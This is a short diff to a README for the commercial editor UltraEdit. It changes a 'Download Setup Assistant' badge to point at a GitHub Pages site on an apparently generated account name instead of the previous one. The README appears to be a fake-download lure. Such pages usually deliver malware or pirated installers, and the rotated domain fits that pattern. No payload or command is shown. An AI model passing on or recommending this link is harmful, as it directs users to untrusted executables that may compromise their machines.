@@ -1,6 +1,6 @@
 # UltraEdit 
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://ultraedit-downloadtool.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://robynclatonpcpvuy.github.io/.github/UltraEdit-download)
 
 ---
 
